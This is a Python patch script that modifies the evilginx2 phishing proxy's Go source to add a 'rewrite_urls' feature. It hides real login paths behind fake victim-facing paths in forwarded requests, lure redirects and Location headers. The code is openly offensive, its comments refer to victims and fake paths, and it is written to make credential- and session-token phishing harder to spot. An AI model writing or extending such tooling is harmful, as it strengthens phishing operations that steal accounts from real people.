#!/usr/bin/env python3
# patch_rewrite.py — Pro-feature #10: rewrite_urls. Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:140]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

# 1) ConfigPhishlet: new DSL key
patch("core/phishlet.go",
      '\tIntercept   *[]ConfigIntercept `mapstructure:"intercept"`\n}',
      '\tIntercept   *[]ConfigIntercept `mapstructure:"intercept"`\n'
      '\tRewriteUrls *[]ConfigRewriteUrl `mapstructure:"rewrite_urls"`\n}')

# 2) Phishlet struct: compiled list
patch("core/phishlet.go",
      "\tcookieAuthTokens map[string][]*CookieAuthToken\n",
      "\tcookieAuthTokens map[string][]*CookieAuthToken\n"
      "\trewriteUrls      []*RewriteUrl\n")

# 3) loader: parse rewrite_urls before auth_tokens
patch("core/phishlet.go",
      "\tfor _, at := range *fp.AuthTokens {\n",
      "\tif fp.RewriteUrls != nil {\n"
      "\t\tfor _, ru := range *fp.RewriteUrls {\n"
      "\t\t\tif ru.From == nil || ru.To == nil {\n"
      '\t\t\t\treturn fmt.Errorf("rewrite_urls: \'from\' and \'to\' are required")\n'
      "\t\t\t}\n"
      "\t\t\tif err := p.addRewriteUrl(*ru.From, *ru.To); err != nil {\n"
      "\t\t\t\treturn err\n"
      "\t\t\t}\n"
      "\t\t}\n"
      "\t}\n"
      "\tfor _, at := range *fp.AuthTokens {\n")

# 4) proxy: rewrite victim path -> origin path before forwarding
patch("core/http_proxy.go",
      '\t\t\t\t// replace "Host" header\n',
      '\t\t\t\t// rewrite_urls: map victim-facing path to real origin path\n'
      '\t\t\t\tif pl != nil {\n'
      '\t\t\t\t\tif np := pl.rewritePathIn(req.URL.Path); np != req.URL.Path {\n'
      '\t\t\t\t\t\tlog.Debug("rewrite_urls: %s -> %s", req.URL.Path, np)\n'
      '\t\t\t\t\t\treq.URL.Path = np\n'
      '\t\t\t\t\t}\n'
      '\t\t\t\t}\n'
      '\n'
      '\t\t\t\t// replace "Host" header\n')

# 5) lure->login redirect hands the victim the fake path
patch("core/http_proxy.go",
      "\t\t\t\trurl := pl.GetLoginUrl()\n",
      "\t\t\t\trurl := pl.rewriteUrlOut(pl.GetLoginUrl())\n")

# 6) origin redirects carry the fake path back to the victim
patch("core/http_proxy.go",
      "\t\t\t// modify received body\n",
      "\t\t\t// rewrite_urls: map origin paths back to victim-facing paths in redirects\n"
      "\t\t\tif pl != nil && len(pl.rewriteUrls) > 0 {\n"
      '\t\t\t\tif loc := resp.Header.Get("Location"); loc != "" {\n'
      "\t\t\t\t\tresp.Header.Set(\"Location\", pl.rewriteUrlOut(loc))\n"
      "\t\t\t\t}\n"
      "\t\t\t}\n"
      "\n"
      "\t\t\t// modify received body\n")

print("[done] rewrite_urls patches applied")
